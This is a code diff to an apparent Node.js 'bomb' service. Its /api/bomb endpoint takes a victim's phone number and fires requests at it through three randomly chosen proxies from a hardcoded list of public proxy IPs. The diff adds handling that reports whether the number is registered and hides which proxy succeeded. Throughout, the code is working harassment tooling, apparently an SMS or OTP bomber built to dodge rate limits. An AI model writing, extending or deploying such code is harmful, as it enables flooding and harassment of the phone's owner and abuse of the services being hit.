@@ -10,7 +10,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 100 PROXIES (အရင်အတိုင်း)
+// 100 PROXIES
 const proxies = [
     "http://80.74.54.148:3128", "http://142.93.202.130:3128", "http://34.43.46.91:443",
     "http://103.178.160.149:3128", "http://103.158.210.21:8090", "http://165.154.162.73:8888",
@@ -64,8 +64,6 @@ app.get('/api/bomb', async (req, res) => {
     const phone = req.query.phone;
     if (!phone) return res.status(400).json({ error: 'Phone number required' });
 
-    // ကျပန်း Proxy ၃ ခုကို ရွေးပြီး တစ်ပြိုင်နက်တည်း ပို့မယ်
-    // တစ်ခုခု အောင်မြင်ရင် ချက်ချင်း ပြန်ပေးမယ် (အရမ်းမြန်တယ်)
     const shuffled = [...proxies].sort(() => 0.5 - Math.random());
     const selectedProxies = shuffled.slice(0, 3);
     
@@ -99,23 +97,29 @@ app.get('/api/bomb', async (req, res) => {
                 validateStatus: () => true 
             });
 
+            // 404 Not Registered ကို ဖမ်းမယ်
+            if (!completed && response.status === 404) {
+                completed = true;
+                return res.status(404).json({ status: 'not_registered' });
+            }
+
+            // 200 ဒါမှမဟုတ် 500 ဆိုရင် အောင်မြင်တယ်
             if (!completed && (response.status === 200 || response.status === 500)) {
                 completed = true;
-                return res.json({ status: 'success', proxy: proxyUrl });
+                return res.json({ status: 'success' });
             }
         } catch (error) {
             // Error တက်ရင် ကျော်မယ်
         }
     });
 
-    // Promise.race သုံးပြီး ပထမဆုံး အောင်မြင်တဲ့အဖြေကို ယူမယ်
     const result = await Promise.race([
         Promise.all(attempts),
         new Promise((resolve) => setTimeout(() => resolve({ status: 'timeout' }), 3500))
     ]);
 
-    if (result && result.status === 'success') {
-        return; // response ပို့ပြီးသား
+    if (result && (result.status === 'success' || result.status === 'not_registered')) {
+        return;
     }
 
     if (!res.headersSent) {
